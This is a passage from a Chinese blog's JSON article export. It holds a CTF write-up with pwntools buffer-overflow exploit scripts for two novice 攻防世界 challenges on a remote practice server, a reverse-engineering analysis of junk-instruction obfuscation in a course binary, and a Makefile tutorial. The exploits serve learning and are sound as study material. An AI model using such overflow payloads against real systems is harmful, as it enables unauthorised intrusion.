class=\"line\">[Finished in 0.1s]</span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":"Lab1——sysmagic防护1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic<br>[*] &apos;/home/liwc/pwn","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]},{"title":"攻防世界刷题——新手练习","slug":"攻防世界刷题——新手练习","date":"2019-03-20T08:15:35.000Z","updated":"2019-09-21T08:34:07.732Z","comments":true,"path":"api/articles/攻防世界刷题——新手练习.json","excerpt":"<h1 id=\"新手练习\"><a href=\"#新手练习\" class=\"headerlink\" title=\"新手练习\"></a>新手练习</h1><h2 id=\"when-did-you-born\"><a href=\"#when-did-you-born\" class=\"headerlink\" title=\"when_did_you_born\"></a>when_did_you_born</h2><p>gets(&amp;v4)处存在栈溢出，覆盖掉v5，为1926(0x786)即可。</p>\n<p>v4 = rsp+0x0; v5 = rsp + 0x8; 所以偏移为0x8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Birth?\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v5);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Name?\"</span>);</span><br><span class=\"line\">    gets(&amp;v4);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"You Are Born In %d\\n\"</span>, v5);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">1926</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"You Shall Have Flag.\"</span>);</span><br><span class=\"line\">      system(<span class=\"string\">\"cat flag\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./when_did_you_born\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31452</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Birth?\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"123\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Name?\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">8</span> + <span class=\"string\">\"\\x86\\x07\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"hello-pwn\"><a href=\"#hello-pwn\" class=\"headerlink\" title=\"hello_pwn\"></a>hello_pwn</h2><p>该题跟上一题类似，也是溢出，不过是溢出全局变量。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  alarm(<span class=\"number\">0x3C</span>u);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"~~ welcome to ctf ~~     \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"lets get helloworld for bof\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;unk_601068, <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( dword_60106C == <span class=\"number\">1853186401</span> )</span><br><span class=\"line\">    sub_400686();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0L</span>L;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./hello_pwn\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31454</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"lets get helloworld for bof\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">4</span> + <span class=\"string\">\"\\x61\\x61\\x75\\x6e\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":"新手练习when_did_you_borngets(&amp;v4)处存在栈溢出，覆盖掉v5，为1926(0x786)即可。v4 = rsp+0x0; v5 = rsp + 0x8; 所以偏移为0x81<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]},{"title":"花指令去除wp","slug":"花指令去除wp","date":"2018-12-05T13:50:11.000Z","updated":"2019-09-21T08:34:17.670Z","comments":true,"path":"api/articles/花指令去除wp.json","excerpt":"<p>​    这学期《恶意代码分析》这门课的作业留了一道RE题，其中包含大量批量插入的花指令。在这里简单记录一下分析过程。</p>\n<h2 id=\"0x00-基本分析\"><a href=\"#0x00-基本分析\" class=\"headerlink\" title=\"0x00  基本分析\"></a>0x00  基本分析</h2><p>首先动态执行程序看一下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\UCAS\\malware_analyse&gt;Anti.exe</span><br><span class=\"line\">The encypted flag in hex is:</span><br><span class=\"line\">3A3B3138233B3C3437300B3730073228393523062E2B242A</span><br><span class=\"line\">Please input cipher character:3</span><br><span class=\"line\">Hex result for encrypt string 'thisisasimplesamplestring' is:</span><br><span class=\"line\">7A6D6B7E63756C706D61766661796B62756067787271656B6B</span><br></pre></td></tr></table></figure>\n<p>输入点只有一个，要求输入一个加密字符，然后就会输出对<code>thisisasimplesamplestring</code>字符串的加密结果。那么显然，只要我们能够分析并逆向出加密算法，就能把加密后的flag解密得到原flag，当然这个加密算法应该是可逆的，否则就有点难办了。</p>\n<p>首先用IDA加载Anti.exe，并加载题目所给的pdb文件——应该说出题人还是很好的（谢谢师兄~_~）。之后粗略浏览反汇编代码，主要有两点发现：</p>\n<ul>\n<li>该程序应该由C++语言编写，因为有虚表和类层次关系</li>\n<li>代码中添加了大量花指令</li>\n</ul>\n<h2 id=\"0x01-花指令分析\"><a href=\"#0x01-花指令分析\" class=\"headerlink\" title=\"0x01  花指令分析\"></a>0x01  花指令分析</h2><p>下面对代码中涉及到的花指令作基本分析</p>\n<p>1.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A1B loc_401A1B:                             ; CODE XREF: .text:loc_401A1B↑j</span><br><span class=\"line\">.text:00401A1B                 jmp     short near ptr loc_401A1B+1</span><br><span class=\"line\">.text:00401A1D ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1D                 ror     byte ptr [eax-73h], 45h</span><br></pre></td></tr></table></figure>\n<p>这是因为两条顺序执行的指令使用了一个公共byte，而IDA在反汇编完一条指令后，会从这条指令的下一个地址处开始反汇编，所以无法表示这种情况。具体来说，0x401a1b处是<code>0xeb</code>,0x401a1c处是<code>0xff</code>，IDA首先把0xeb翻译成jmp指令，然后往下找操作数，是短跳转+1；之后，就会顺序反汇编0x401a1d处的内容。但是程序在执行时实际上跳转到0x1a1c处执行，这就导致一个矛盾。</p>\n<p>手工去掉花指令还原即可，暂时不用管那个垃圾字节，在脚本批量去除阶段可以Patch为NOP指令。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A14 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1B                 db 0EBh</span><br><span class=\"line\">.text:00401A1C ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A1C                 inc     eax</span><br><span class=\"line\">.text:00401A1E                 dec     eax</span><br><span class=\"line\">.text:00401A1F                 lea     eax, [ebp-34h]</span><br></pre></td></tr></table></figure>\n<p>2.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:004019E5                 push    offset __ehhandler$?enc2@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V12@D@Z</span><br><span class=\"line\">.text:004019EA                 mov     eax, large fs:0</span><br><span class=\"line\">.text:004019F0                 push    eax</span><br><span class=\"line\">.text:004019F1                 mov     large fs:0, esp</span><br><span class=\"line\">......</span><br><span class=\"line\">.text:00401A4E                 xor     eax, eax</span><br><span class=\"line\">.text:00401A50                 idiv    eax</span><br><span class=\"line\">.text:00401A52                 retn</span><br><span class=\"line\">.text:00401A53                 db 8Bh</span><br><span class=\"line\">.text:00401A54                 dd 64082464h, 0A1h, 8B008B00h, 0A36400h, 83000000h, 5D5808C4h</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<p>这算是第二种花指令。0x4019e5处的四条指令首先将fs[0]压入堆栈，从而使得执行完成后，fs[0]指向栈顶。之后，构造一个err结构。在0x401a4e处，故意触发一个除零异常，然后就会进入异常处理流程。</p>\n<p>同时，由于除零后是一条retn指令，IDA在反汇编时不会将retn的下一个地址识别为指令，直到找到一个函数头<code>push    ebp; mov    ebp, esp</code> ，这又使得反汇编出错。</p>\n<p>详细的异常处理流程我们在静态分析阶段不好分析，如读者感兴趣可以详细查阅资料。但我们通过OD调试可以大体了解程序的控制流。</p>\n<p>在0x401a50处下断，并在调试选项中去掉所有忽略异常的勾选，点击确定后F9断到断点处，然后F8单步调试，到达如下位置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C92E460    8B1C24          mov ebx,dword ptr ss:[esp]</span><br><span class=\"line\">7C92E463    51              push ecx</span><br><span class=\"line\">7C92E464    53              push ebx</span><br><span class=\"line\">7C92E465    E8 E6C40100     call ntdll.7C94A950</span><br></pre></td></tr></table></figure>\n<p>F7步入函数调用，然后继续单步跟，看到一个可疑位置，会将0x401a53的地址作为参数压栈，然后调用一个函数，步入函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C923261    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923265    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923269    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C92326D    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923271    FF7424 20       push dword ptr ss:[esp+0x20]             ; Anti.00401A53</span><br><span class=\"line\">7C923275    E8 08000000     call ntdll.7C923282</span><br></pre></td></tr></table></figure>\n<p>果然，此处最终<code>call ecx</code>，使得eip跳转到0x401a53处执行。所以我们应该在0x401a53处按C识别为代码，修复反汇编。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7C923289    64:FF35 0000000&gt;push dword ptr fs:[0]</span><br><span class=\"line\">7C923290    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class=\"line\">7C923297    FF75 14         push dword ptr ss:[ebp+0x14]</span><br><span class=\"line\">7C92329A    FF75 10         push dword ptr ss:[ebp+0x10]</span><br><span class=\"line\">7C92329D    FF75 0C         push dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">7C9232A0    FF75 08         push dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">7C9232A3    8B4D 18         mov ecx,dword ptr ss:[ebp+0x18]          ; Anti.00401A53</span><br><span class=\"line\">7C9232A6    FFD1            call ecx                                 ; Anti.00401A53</span><br></pre></td></tr></table></figure>\n<p>3.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A8A                 jz      near ptr loc_401A96+4</span><br><span class=\"line\">.text:00401A90                 jnz     near ptr loc_401A96+4</span><br><span class=\"line\">.text:00401A96</span><br><span class=\"line\">.text:00401A96 loc_401A96:                             ; CODE XREF: .text:00401A8A↑j</span><br><span class=\"line\">.text:00401A96                                         ; .text:00401A90↑j</span><br><span class=\"line\">.text:00401A96                 call    near ptr 0F733CACh</span><br></pre></td></tr></table></figure>\n<p>比起上面两种花指令，这一种都算小菜啦。构造连续两个互补的条件跳转到同一位置。因为条件跳转为基本块出口，诱导IDA反汇编基本块邻接地址为新的基本块入口。实际上只是几个字节的垃圾数据。简单修复即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401A8A                 jz      loc_401A9A</span><br><span class=\"line\">.text:00401A90                 jnz     loc_401A9A</span><br><span class=\"line\">.text:00401A90 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A96                 db 0E8h</span><br><span class=\"line\">.text:00401A97                 db  11h</span><br><span class=\"line\">.text:00401A98                 db  22h ; &quot;</span><br><span class=\"line\">.text:00401A99                 db  33h ; 3</span><br><span class=\"line\">.text:00401A9A ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401A9A</span><br><span class=\"line\">.text:00401A9A loc_401A9A:                             ; CODE XREF: .text:00401A8A↑j</span><br><span class=\"line\">.text:00401A9A                                         ; .text:00401A90↑j</span><br></pre></td></tr></table></figure>\n<p>4.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ACA                 xor     eax, eax</span><br><span class=\"line\">.text:00401ACC                 jz      near ptr loc_401AD2+1</span><br><span class=\"line\">.text:00401AD2</span><br><span class=\"line\">.text:00401AD2 loc_401AD2:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD2                 call    near ptr 0D085A62Fh</span><br></pre></td></tr></table></figure>\n<p>这种是构造一个恒真的条件跳转，再加上一个垃圾字节，很好理解。简单修复即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00401ACA                 xor     eax, eax</span><br><span class=\"line\">.text:00401ACC                 jz      loc_401AD3</span><br><span class=\"line\">.text:00401ACC ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401AD2                 db 0E8h</span><br><span class=\"line\">.text:00401AD3 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00401AD3</span><br><span class=\"line\">.text:00401AD3 loc_401AD3:                             ; CODE XREF: .text:00401ACC↑j</span><br><span class=\"line\">.text:00401AD3                 pop     eax</span><br><span class=\"line\">.text:00401AD4                 mov     eax, [ebp-30h]</span><br></pre></td></tr></table></figure>\n<p>分析到这里，第一个函数enc1的花指令我们已经完全去除了，在IDA中按F5可以进行反编译。不过在手动分析下一个函数后，按F5无法进行反编译。这是因为IDA没有将其识别为函数，我们在已修复的函数入口点处按P MakeProc即可。</p>","keywords":null,"cover":null,"content":null,"text":"​    这学期《恶意代码分析》这门课的作业留了一道RE题，其中包含大量批量插入的花指令。在这里简单记录一下分析过程。0x00  基本分析首先动态执行程序看一下1<br>2<br>3<br>4<br>5<br>6<br>D:\\UCAS\\malware_analyse&gt;Ant","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]},{"title":"一个简单的Makefile教程","slug":"一个简单的Makefile教程","date":"2018-11-19T14:31:41.000Z","updated":"2019-09-21T08:34:01.359Z","comments":true,"path":"api/articles/一个简单的Makefile教程.json","excerpt":"<p>Makefile是一种组织代码编译的简单方法。这个教程将会指导你编写中小规模项目的makefile文件。</p>\n<h2 id=\"0x00-一个简单的例子\"><a href=\"#0x00-一个简单的例子\" class=\"headerlink\" title=\"0x00  一个简单的例子\"></a>0x00  一个简单的例子</h2><p>让我们首先引入下面这三个文件，hellomake.c，hellofunc.c，hellomake.h：三者组成一个标准的C程序。</p>\n<p><code>hellomake.c</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;hellomake.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// call a function in another file</span></span><br><span class=\"line\">    myPrintHelloMake();</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>hellofunc.c</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;hellomake.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">myPrintHelloMake</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Hello makefiles!\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>hellomake.h</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">example include file</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">myPrintHelloMake</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br></pre></td></tr></table></figure>\n<p>一般地，可以通过下面的指令编译这些代码</p>\n<p><code>gcc -o hellomake hellomake.c hellofunc.c -I.</code></p>\n<p>这将编译两个.c文件 hellomake.c、hellofunc.c，并且指定可执行文件的名字为hellomake。-I dir是指定搜索头文件的目录的路径为dir，而-I.是指定在当前目录下寻找。没有makefile的话，为了重复测试/修改/调试你的代码，常见的做法是用上方向键在终端中找到上一条指令，因而你就不用每次重新输入指令。</p>\n<p>不幸的是，这种做法有两个弊端。第一，如果你弄丢了编译指令或者换了一台计算机，你将不得不重新输入，导致效率极低。第二，如果你只修改了一个.c文件，每次都重新编译所有的文件也是耗时且低效的。因此，我们需要学习如何使用makefile。</p>\n<h2 id=\"0x01-Makefile1\"><a href=\"#0x01-Makefile1\" class=\"headerlink\" title=\"0x01  Makefile1\"></a>0x01  Makefile1</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hellomake: hellomake.c hellofunc.c</span><br><span class=\"line\">\tgcc -o hellomake hellomake.c hellofunc.c -I.</span><br></pre></td></tr></table></figure>\n<p>将上述规则（rule）写到文件Makefile或makefile中，放在同一路径下，然后键入make就可以执行相应的编译。另外，通过将指令所需要的文件列在第一行的冒号之后，make会知道规则hellomake在这些文件之一被修改时需要被执行。此时，你已经解决了问题1——不需要再使用上方向键了。</p>\n<p><em>gcc指令之前需要有一个tab，而且在任何指令之前必须有一个tab。(必须是tab不能是空格)</em></p>","keywords":null,"cover":null,"content":null,"text":"Makefile是一种组织代码编译的简单方法。这个教程将会指导你编写中小规模项目的makefile文件。0x00  一个简单的例子让我们首先引入下面这三个文件，hellomake.c，hellofunc.c，hellomake.h：三者组成一个标准的C程序。hellomake.c","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"Dev","slug":"Dev","count":2,"path":"api/tags/Dev.json"}]}]}